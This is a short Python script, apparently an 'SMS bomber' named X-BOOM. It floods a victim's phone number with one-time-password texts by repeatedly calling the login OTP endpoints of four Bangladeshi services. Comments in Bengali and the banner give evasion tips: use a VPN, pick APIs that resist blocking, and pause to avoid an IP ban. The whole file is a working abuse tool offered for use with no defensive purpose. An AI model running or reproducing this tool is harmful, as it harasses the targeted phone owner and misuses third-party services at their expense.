import requests, os, time, random

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM FINAL BYPASS (2026)      ")
    print("     Note: Use VPN for 100% Success     ")
    print("========================================")

def send_sms(target, count):
    # ৪টি ভিন্ন ভিন্ন এপিআই যা সহজে ব্লক হয় না
    urls = [
        {"url": "https://api.sharetrip.net/api/v1/otp/send", "data": {"mobileNumber": target, "type": "login"}},
        {"url": "https://api.shikho.com/api/v1/auth/send-otp", "data": {"phone": target, "type": "login"}},
        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}},
        {"url": "https://api-hermes.pathao.com/user/otp-send/login", "data": {"phone": "+88" + target}}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    print(f"\n[+] Target: {target}")
    for i in range(count):
        api = random.choice(urls) # একেক বার একেক এপিআই দিয়ে ট্রাই করবে
        try:
            res = requests.post(api["url"], json=api["data"], headers=headers, timeout=10)
            if res.status_code in [200, 201]:
                print(f"[!] SMS {i+1} Sent Successfully!")
            else:
                print(f"[?] SMS {i+1} Filtered by Server")
        except:
            print(f"[-] Error at SMS {i+1}")
        
        time.sleep(10) # ১০ সেকেন্ড বিরতি দিন, নতুবা আপনার আইপি সাথে সাথে ব্লক হবে

def main():
    banner()
    num = input("Number (01xxxxxxxxx): ")
    amt = int(input("Amount: "))
    send_sms(num, amt)

if __name__ == "__main__":
    main()


  


